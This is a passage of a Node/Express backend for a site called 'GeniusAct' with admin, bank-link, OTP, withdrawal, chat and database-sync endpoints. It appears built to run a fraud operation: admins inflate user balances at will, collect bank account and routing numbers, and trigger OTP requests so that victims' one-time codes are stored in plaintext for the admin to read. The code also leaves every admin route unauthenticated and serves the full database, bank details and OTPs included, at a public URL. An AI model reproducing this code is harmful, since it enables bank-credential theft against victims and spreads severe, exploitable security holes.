    saveCloudDb(currentDb);
    return res.json({ success: true, user: targetUser });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Delete User
app.post('/api/admin/delete-user', (req, res) => {
  try {
    const { identifier } = req.body || {};
    if (!identifier) return res.status(400).json({ error: 'User identifier required' });

    const currentDb = getCloudDb();
    const idStr = String(identifier).trim().toLowerCase();

    currentDb['geniusact_approved_users'] = (currentDb['geniusact_approved_users'] || []).filter(u => 
      !(u.uid && String(u.uid).toLowerCase() === idStr) && !(u.email && String(u.email).toLowerCase() === idStr)
    );
    currentDb['geniusact_pending_users'] = (currentDb['geniusact_pending_users'] || []).filter(u => 
      !(u.uid && String(u.uid).toLowerCase() === idStr) && !(u.email && String(u.email).toLowerCase() === idStr)
    );

    saveCloudDb(currentDb);
    return res.json({ success: true, message: 'User record removed from database.' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Add Funds / Balance Adjustment
app.post('/api/admin/add-funds', (req, res) => {
  try {
    const { identifier, amount, description } = req.body || {};
    if (!identifier || amount === undefined) {
      return res.status(400).json({ error: 'Identifier and amount required' });
    }
    const currentDb = getCloudDb();
    let approvedUsers = currentDb['geniusact_approved_users'] || [];
    let pendingUsers = currentDb['geniusact_pending_users'] || [];
    const idStr = String(identifier).trim().toLowerCase();

    let user = approvedUsers.find(u => (u.uid && String(u.uid).toLowerCase() === idStr) || (u.email && String(u.email).toLowerCase() === idStr));
    if (!user) {
      user = pendingUsers.find(u => (u.uid && String(u.uid).toLowerCase() === idStr) || (u.email && String(u.email).toLowerCase() === idStr));
    }
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const parsedAmount = parseFloat(amount) || 0;
    user.amount = (user.amount || 0) + parsedAmount;
    if (!Array.isArray(user.donations)) user.donations = [];
    user.donations.unshift({
      id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
      amount: parsedAmount,
      description: description || 'Administrative Fund Adjustment',
      date: new Date().toISOString(),
      status: 'completed'
    });

    saveCloudDb(currentDb);
    return res.json({ success: true, user, message: 'Funds adjusted successfully.' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Clear All Application Data
app.post('/api/admin/clear-all-data', (req, res) => {
  try {
    const currentDb = getCloudDb();
    currentDb['geniusact_approved_users'] = [];
    currentDb['geniusact_pending_users'] = [];
    currentDb['geniusact_visitor_logs'] = [];
    currentDb['geniusact_support_messages'] = [];
    currentDb['geniusact_bank_links'] = [];
    currentDb['geniusact_contact_chats'] = [];
    currentDb['geniusact_user_footprints'] = [];
    currentDb['geniusact_withdrawal_requests'] = [];
    currentDb['admin_actions'] = [];
    currentDb['kyc_audit'] = [];
    saveCloudDb(currentDb);
    return res.json({ success: true, message: 'All application data has been cleared.' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin KYC Decision
app.post('/api/admin/kyc/action', (req, res) => {
  try {
    const { uid, email, action, reason } = req.body || {};
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];

    const user = approvedUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!user.kyc) user.kyc = {};
    user.kyc.status = action === 'approve' ? 'approved' : 'rejected';
    user.kyc.decisionAt = new Date().toISOString();
    if (reason) user.kyc.rejectionReason = reason;

    saveCloudDb(currentDb);
    return res.json({ success: true, user });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Withdrawal Decision
app.post('/api/admin/withdrawals/action', (req, res) => {
  try {
    const { id, status } = req.body || {};
    const currentDb = getCloudDb();
    const withdrawals = currentDb['geniusact_withdrawal_requests'] || [];

    const reqItem = withdrawals.find(w => w.id === id);
    if (reqItem) {
      reqItem.status = status;
      reqItem.processedAt = new Date().toISOString();
      saveCloudDb(currentDb);
      return res.json({ success: true, withdrawal: reqItem });
    }

    return res.status(404).json({ error: 'Withdrawal request not found' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Bank OTP Action
app.post('/api/admin/bank/otp', (req, res) => {
  try {
    const { id, action } = req.body || {};
    const currentDb = getCloudDb();
    const bankLinks = currentDb['geniusact_bank_links'] || [];

    const link = bankLinks.find(l => l.id === id || l.userEmail === id);
    if (!link) {
      return res.status(404).json({ error: 'Bank record not found' });
    }

    if (action === 'request') {
      link.otpRequested = true;
      link.otpSubmitted = null;
      link.otpRequestedAt = new Date().toISOString();
    } else if (action === 'verify') {
      link.otpVerified = true;
      link.otpVerifiedAt = new Date().toISOString();
    }

    saveCloudDb(currentDb);
    return res.json({ success: true, bankLink: link });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// -------------------------------------------------------------
// BANK & WITHDRAWAL ENDPOINTS FOR SUPPORTERS
// -------------------------------------------------------------

app.post('/api/bank/link', (req, res) => {
  try {
    const { userEmail, bankName, accountNumber, routingNumber, accountHolder, accountType } = req.body || {};
    if (!userEmail || !bankName || !accountNumber) {
      return res.status(400).json({ error: 'Missing required bank linkage fields' });
    }

    const currentDb = getCloudDb();
    const bankLinks = currentDb['geniusact_bank_links'] || [];

    const existingIdx = bankLinks.findIndex(b => b.userEmail && b.userEmail.toLowerCase() === String(userEmail).toLowerCase());
    const bankRecord = {
      id: 'bnk_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      userEmail: String(userEmail).toLowerCase(),
      bankName,
      accountNumber: String(accountNumber),
      routingNumber: String(routingNumber || ''),
      accountHolder: accountHolder || '',
      accountType: accountType || 'Checking',
      linkedAt: new Date().toISOString(),
      otpRequested: false,
      otpVerified: false
    };

    if (existingIdx !== -1) {
      bankLinks[existingIdx] = { ...bankLinks[existingIdx], ...bankRecord, id: bankLinks[existingIdx].id };
    } else {
      bankLinks.push(bankRecord);
    }

    currentDb['geniusact_bank_links'] = bankLinks;
    saveCloudDb(currentDb);

    return res.json({ success: true, bankLink: bankRecord });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/bank/submit-otp', (req, res) => {
  try {
    const { userEmail, otp } = req.body || {};
    if (!userEmail || !otp) return res.status(400).json({ error: 'Email and OTP required' });

    const currentDb = getCloudDb();
    const bankLinks = currentDb['geniusact_bank_links'] || [];
    const link = bankLinks.find(b => b.userEmail && b.userEmail.toLowerCase() === String(userEmail).toLowerCase());

    if (!link) return res.status(404).json({ error: 'Bank linkage not found' });

    link.otpSubmitted = String(otp);
    link.otpSubmittedAt = new Date().toISOString();

    saveCloudDb(currentDb);
    return res.json({ success: true, bankLink: link });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/withdraw', (req, res) => {
  try {
    const { userEmail, amount, bankId, withdrawalMethod } = req.body || {};
    if (!userEmail || !amount) return res.status(400).json({ error: 'Email and withdrawal amount required' });

    const cleanEmail = String(userEmail).toLowerCase();
    const parsedAmount = parseFloat(amount) || 0;
    const currentDb = getCloudDb();

    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const user = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);

    if (!user) return res.status(404).json({ error: 'Supporter account not found' });
    if (user.amount < parsedAmount) return res.status(400).json({ error: 'Insufficient account balance' });

    const newWithdrawal = {
      id: 'wdr_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      userEmail: cleanEmail,
      amount: parsedAmount,
      bankId: bankId || 'Primary Linked Account',
      method: withdrawalMethod || 'Direct Bank Wire',
      status: 'pending',
      timestamp: new Date().toISOString()
    };

    if (!Array.isArray(currentDb['geniusact_withdrawal_requests'])) currentDb['geniusact_withdrawal_requests'] = [];
    currentDb['geniusact_withdrawal_requests'].unshift(newWithdrawal);

    // Deduct user balance
    user.amount -= parsedAmount;

    saveCloudDb(currentDb);
    return res.json({ success: true, withdrawal: newWithdrawal, remainingBalance: user.amount });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// -------------------------------------------------------------
// CHAT & SUPPORT REST ENDPOINTS
// -------------------------------------------------------------

app.post('/api/chat/message', (req, res) => {
  try {
    const { chatId, userEmail, userName, accountId, isGuest, message } = req.body || {};
    if (!message || (!chatId && !userEmail)) {
      return res.status(400).json({ error: 'Missing required chat message parameters' });
    }
    const currentDb = getCloudDb();
    const chats = currentDb['geniusact_contact_chats'] || [];
    const cleanEmail = userEmail ? String(userEmail).toLowerCase() : null;

    let existingChat = chats.find(c => 
      (chatId && c.chatId === chatId) || 
      (cleanEmail && c.userEmail && c.userEmail.toLowerCase() === cleanEmail)
    );

    const now = new Date().toISOString();
    const msgObj = {
      id: message.id || ('m_' + Date.now()),
      sender: message.sender || 'user',
      text: message.text || '',
      media: message.media || null,
      timestamp: message.timestamp || now,
      accountId: accountId || (existingChat ? existingChat.accountId : 'FEC-87492109')
    };

    if (existingChat) {
      if (!Array.isArray(existingChat.messages)) existingChat.messages = [];
      existingChat.messages.push(msgObj);
      existingChat.lastUpdated = now;
      existingChat.unreadAdminCount = (existingChat.unreadAdminCount || 0) + 1;
      if (userName && userName !== 'Guest Visitor') existingChat.userName = userName;
      if (cleanEmail) existingChat.userEmail = cleanEmail;
    } else {
      existingChat = {
        chatId: chatId || ('chat_' + (cleanEmail ? cleanEmail.replace(/[^a-z0-9]/g, '_') : Date.now())),
        userEmail: cleanEmail || 'supportgeniusactglobal@gmail.com',
        userName: userName || 'Guest Visitor',
        accountId: accountId || 'FEC-87492109',
        isGuest: Boolean(isGuest),
        createdAt: now,
        lastUpdated: now,
        unreadAdminCount: 1,
        unreadUserCount: 0,
        messages: [msgObj]
      };
      chats.unshift(existingChat);
    }

    currentDb['geniusact_contact_chats'] = chats;
    saveCloudDb(currentDb);
    return res.json({ success: true, chat: existingChat, chats });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/chat/admin-reply', (req, res) => {
  try {
    const { chatId, userEmail, message } = req.body || {};
    if ((!chatId && !userEmail) || !message) return res.status(400).json({ error: 'ChatId or userEmail, and message required' });
    const currentDb = getCloudDb();
    const chats = currentDb['geniusact_contact_chats'] || [];
    const cleanEmail = userEmail ? String(userEmail).toLowerCase() : null;

    let targetChat = chats.find(c => 
      (chatId && c.chatId === chatId) || 
      (cleanEmail && c.userEmail && c.userEmail.toLowerCase() === cleanEmail)
    );

    const now = new Date().toISOString();
    const msgObj = {
      id: message.id || ('r_' + Date.now()),
      sender: 'admin',
      text: message.text || (typeof message === 'string' ? message : ''),
      media: message.media || null,
      timestamp: message.timestamp || now
    };

    if (targetChat) {
      if (!Array.isArray(targetChat.messages)) targetChat.messages = [];
      targetChat.messages.push(msgObj);
      targetChat.lastUpdated = now;
      targetChat.unreadUserCount = (targetChat.unreadUserCount || 0) + 1;
      targetChat.unreadAdminCount = 0;
    } else {
      targetChat = {
        chatId: chatId || ('chat_' + Date.now()),
        userEmail: cleanEmail || 'supporter@geniusact.org',
        userName: cleanEmail ? cleanEmail.split('@')[0] : 'Visitor',
        isGuest: true,
        lastUpdated: now,
        unreadUserCount: 1,
        unreadAdminCount: 0,
        messages: [msgObj]
      };
      chats.unshift(targetChat);
    }

    saveCloudDb(currentDb);
    return res.json({ success: true, chat: targetChat, chats });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/chat/delete', (req, res) => {
  try {
    const { chatId } = req.body || {};
    if (!chatId) return res.status(400).json({ error: 'chatId required' });
    const currentDb = getCloudDb();
    let chats = currentDb['geniusact_contact_chats'] || [];
    chats = chats.filter(c => c.chatId !== chatId && c.userEmail !== chatId);
    currentDb['geniusact_contact_chats'] = chats;
    saveCloudDb(currentDb);
    return res.json({ success: true, chats });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.post('/api/support/message', (req, res) => {
  try {
    const msg = req.body;
    if (!msg || !msg.message) return res.status(400).json({ error: 'Message content is required' });
    const currentDb = getCloudDb();
    const msgs = currentDb['geniusact_support_messages'] || [];
    msgs.unshift({
      id: msg.id || ('sup_' + Date.now()),
      userEmail: msg.userEmail || 'Guest',
      subject: msg.subject || 'General Support Inquiry',
      message: msg.message,
      timestamp: msg.timestamp || new Date().toISOString(),
      status: 'unread'
    });
    currentDb['geniusact_support_messages'] = msgs;
    saveCloudDb(currentDb);
    return res.json({ success: true, support_messages: msgs });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// -------------------------------------------------------------
// CLOUD-SYNC GET & POST ENDPOINTS
// -------------------------------------------------------------

app.get(['/api/cloud-sync', '/cloud_database.json'], (req, res) => {
  const dbData = getCloudDb();
  res.json(dbData);
});

app.post('/api/cloud-sync', (req, res) => {
  try {
    let payload = req.body;
    if (payload && payload.expectedOtp) {
      try {
        payload = typeof payload.expectedOtp === 'string' ? JSON.parse(payload.expectedOtp) : payload.expectedOtp;
      } catch (e) {
        payload = req.body;
      }
    }

    if (!payload || typeof payload !== 'object') {
      return res.status(400).json({ error: 'Invalid payload' });
    }

    let currentDb = getCloudDb();

    // Smart Merge across devices/countries
    // 1. Pending Users
    if (Array.isArray(payload.geniusact_pending_users)) {
      const existingPending = currentDb['geniusact_pending_users'] || [];
      const approvedList = currentDb['geniusact_approved_users'] || [];
      payload.geniusact_pending_users.forEach(incoming => {
        if (!incoming || !incoming.email) return;
        const cleanEmail = String(incoming.email).trim().toLowerCase();
        // Skip if already approved on server
        if (approvedList.some(a => a && a.email && String(a.email).trim().toLowerCase() === cleanEmail)) {
          return;
        }
        const idx = existingPending.findIndex(p => p && p.email && String(p.email).trim().toLowerCase() === cleanEmail);
        if (idx !== -1) {
          existingPending[idx] = { ...existingPending[idx], ...incoming };
        } else {
          existingPending.push(incoming);
        }
      });
      currentDb['geniusact_pending_users'] = existingPending;
    }

    // 2. Approved Users
    if (Array.isArray(payload.geniusact_approved_users)) {
      const existingApproved = currentDb['geniusact_approved_users'] || [];
      const existingPending = currentDb['geniusact_pending_users'] || [];
      payload.geniusact_approved_users.forEach(incoming => {
        if (!incoming || !incoming.email) return;
        const cleanEmail = String(incoming.email).trim().toLowerCase();
        const idx = existingApproved.findIndex(a => a && a.email && String(a.email).trim().toLowerCase() === cleanEmail);
        if (idx !== -1) {
          existingApproved[idx] = { ...existingApproved[idx], ...incoming };
        } else {
          existingApproved.push(incoming);
        }
        // Remove from pending if now approved
        const pIdx = existingPending.findIndex(p => p && p.email && String(p.email).trim().toLowerCase() === cleanEmail);
        if (pIdx !== -1) {
          existingPending.splice(pIdx, 1);
        }
      });
      currentDb['geniusact_approved_users'] = existingApproved;
      currentDb['geniusact_pending_users'] = existingPending;
    }

    // 3. Visitor Logs
    if (Array.isArray(payload.geniusact_visitor_logs)) {
      const existingLogs = currentDb['geniusact_visitor_logs'] || [];
      const logMap = new Map();
      existingLogs.forEach(l => { if (l && l.id) logMap.set(l.id, l); });
      payload.geniusact_visitor_logs.forEach(l => {
        if (l && l.id && !logMap.has(l.id)) logMap.set(l.id, l);
      });
      currentDb['geniusact_visitor_logs'] = Array.from(logMap.values())
        .sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0))
        .slice(0, 1000);
    }

    // 4. Contact Chats
    if (Array.isArray(payload.geniusact_contact_chats)) {
      const existingChats = currentDb['geniusact_contact_chats'] || [];
      payload.geniusact_contact_chats.forEach(incoming => {
        if (!incoming || (!incoming.chatId && !incoming.userEmail)) return;
        const cId = incoming.chatId;
        const cEmail = incoming.userEmail ? String(incoming.userEmail).toLowerCase() : null;
        const idx = existingChats.findIndex(c => (cId && c.chatId === cId) || (cEmail && c.userEmail && c.userEmail.toLowerCase() === cEmail));
        if (idx !== -1) {
          const combinedMsgs = [...(existingChats[idx].messages || [])];
          (incoming.messages || []).forEach(m => {
            if (!combinedMsgs.some(em => em.id === m.id || (em.timestamp === m.timestamp && em.text === m.text))) {
              combinedMsgs.push(m);
            }
          });
          existingChats[idx] = { ...existingChats[idx], ...incoming, messages: combinedMsgs };
        } else {
          existingChats.push(incoming);
        }
      });
      currentDb['geniusact_contact_chats'] = existingChats;
    }

    // 5. Bank Links
    if (Array.isArray(payload.geniusact_bank_links)) {
      const existingBanks = currentDb['geniusact_bank_links'] || [];
      payload.geniusact_bank_links.forEach(incoming => {
        if (!incoming || !incoming.userEmail) return;
        const bEmail = String(incoming.userEmail).toLowerCase();
        const idx = existingBanks.findIndex(b => b && b.userEmail && b.userEmail.toLowerCase() === bEmail);
        if (idx !== -1) {
          existingBanks[idx] = { ...existingBanks[idx], ...incoming };
        } else {
          existingBanks.push(incoming);
        }
      });
      currentDb['geniusact_bank_links'] = existingBanks;
    }

    // 6. Withdrawal Requests
    if (Array.isArray(payload.geniusact_withdrawal_requests)) {
      const existingW = currentDb['geniusact_withdrawal_requests'] || [];
      payload.geniusact_withdrawal_requests.forEach(incoming => {
        if (!incoming || !incoming.id) return;
        const idx = existingW.findIndex(w => w && w.id === incoming.id);
        if (idx !== -1) {
          existingW[idx] = { ...existingW[idx], ...incoming };
        } else {
          existingW.push(incoming);
        }
      });
      currentDb['geniusact_withdrawal_requests'] = existingW;
    }

    // 7. Support Messages
    if (Array.isArray(payload.geniusact_support_messages)) {
      const existingMsgs = currentDb['geniusact_support_messages'] || [];
      payload.geniusact_support_messages.forEach(incoming => {
        if (!incoming || !incoming.id) return;
        const idx = existingMsgs.findIndex(m => m && m.id === incoming.id);
        if (idx !== -1) {
          existingMsgs[idx] = { ...existingMsgs[idx], ...incoming };
        } else {
          existingMsgs.push(incoming);
        }
      });
      currentDb['geniusact_support_messages'] = existingMsgs;
    }

    // 8. Global Wallets & Object Keys
    if (payload.geniusact_global_wallets && typeof payload.geniusact_global_wallets === 'object') {
      currentDb['geniusact_global_wallets'] = { ...(currentDb['geniusact_global_wallets'] || {}), ...payload.geniusact_global_wallets };
    }

    saveCloudDb(currentDb);
    res.json({ success: true, data: currentDb });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// -------------------------------------------------------------
// CAMPAIGN PROGRESS, UPDATES & PUBLIC ENDPOINTS
// -------------------------------------------------------------

app.get('/api/donations/:supporter_hash', (req, res) => {
  const currentDb = getCloudDb();
  const approvedUsers = currentDb['geniusact_approved_users'] || [];
  const { supporter_hash } = req.params;

  const user = approvedUsers.find(u => (u.uid === supporter_hash) || (u.email && u.email.toLowerCase() === supporter_hash.toLowerCase()));
  const userDonations = user && Array.isArray(user.donations) ? user.donations : [];
  const total = user ? (user.amount || userDonations.reduce((sum, d) => sum + (d.amount || 0), 0)) : 0;

  res.json({
    success: true,
    donations: userDonations.map(d => ({
      receipt_id: d.id,
      amount: d.amount,
      description: d.description,
      status: d.status || 'completed',
      date: d.date
    })),
    total,
    count: userDonations.length
  });
});

app.get('/api/campaign/progress', (req, res) => {
  const currentDb = getCloudDb();
  const progress = (currentDb.campaign_progress || []).map(r => ({
    category: r.category,
    goal: r.goal_amount,
    current: r.current_amount,
    description: r.description,
    deadline: r.deadline,
    percent: r.goal_amount > 0 ? Number(((r.current_amount / r.goal_amount) * 100).toFixed(1)) : 0
  }));
  res.json({ success: true, progress });
});

app.get('/api/campaign/updates', (req, res) => {
  const currentDb = getCloudDb();
  const updates = (currentDb.campaign_updates || []).map(r => ({
    id: r.id,
    title: r.title,
    body: r.body,
    tag: r.tag,
    featured: Boolean(r.is_featured),
    date: r.created_at
  }));
  res.json({ success: true, updates });
});

app.get('/api/campaign/allocation', (req, res) => {
  const currentDb = getCloudDb();
  res.json({ success: true, allocation: currentDb.fund_allocation || [] });
});

app.get('/api/broadcasts/latest', (req, res) => {
  const currentDb = getCloudDb();
  const activeBroadcasts = (currentDb.broadcasts || [])
    .filter(b => b.is_active)
    .slice(0, 5)
    .map(b => ({ message: b.message, date: b.created_at }));
  res.json({ success: true, broadcasts: activeBroadcasts });
});

app.get('/admin-actions', (req, res) => {
  const currentDb = getCloudDb();
  res.json({
    success: true,
    actions: (currentDb.admin_actions || []).slice(0, 50)
  });
});

// -------------------------------------------------------------
// STATIC ASSETS & ROUTING
// -------------------------------------------------------------

app.get('/', (req, res) => {
  res.redirect('/index.html');
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Serve static assets and uploads
app.use(express.static(__dirname));
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use('/static', express.static(path.join(__dirname, 'static')));
app.use('/secure_storage', express.static(UPLOAD_FOLDER));

const IP = process.env.IP;

if (IP) {
  app.listen(PORT, IP, () => {
    console.log(`[GeniusAct Server] Running authoritative backend on ${IP}:${PORT}`);
  });
} else {
  app.listen(PORT, () => {
    console.log(`[GeniusAct Server] Running authoritative backend on port ${PORT}`);
  });
}

export default app;
